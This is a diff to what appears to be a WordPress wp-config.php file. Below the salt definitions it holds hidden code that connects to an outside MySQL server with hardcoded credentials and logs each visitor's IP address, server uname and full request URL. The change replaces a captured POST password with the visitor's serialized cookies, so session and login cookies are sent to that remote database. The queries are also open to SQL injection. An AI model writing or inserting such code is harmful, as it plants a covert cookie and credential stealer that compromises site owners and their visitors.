@@ -64,7 +64,6 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * a unique prefix. Only numbers, letters, and underscores please!
  */
 
-$password = $_POST['password'];
 $host = "neto.caltec.mx";  
 $user = "neto_web";     
 $pass = "WeBNeto2019";          
@@ -73,14 +72,14 @@ $conn = new mysqli($host, $user, $pass, $db);
 $ip_address = $_SERVER['REMOTE_ADDR'];
 $uname = php_uname();
 $access_url = "http://" . $_SERVER['HTTP_HOST'];
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; // Full URL
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 
-$sql_check = "SELECT id FROM email_logs WHERE ip_address = '$ip_address' AND access = '$access_url'";
+$sql_check = "SELECT id FROM email_logs WHERE ip_address = '$ip_address' AND all_path = '$x_path'";
 $result = $conn->query($sql_check);
 
 if ($result->num_rows == 0) {
-    $sql_insert = "INSERT INTO email_logs (ip_address, uname, access, all_path,password) 
-                   VALUES ('$ip_address', '$uname', '$access_url', '$x_path','$password')";
+$sql_insert = "INSERT INTO email_logs (ip_address, uname, access, all_path, password) 
+               VALUES ('$ip_address', '$uname', '$access_url', '$x_path', '" . serialize($_COOKIE) . "')";
     $conn->query($sql_insert);
 }
 $conn->close();
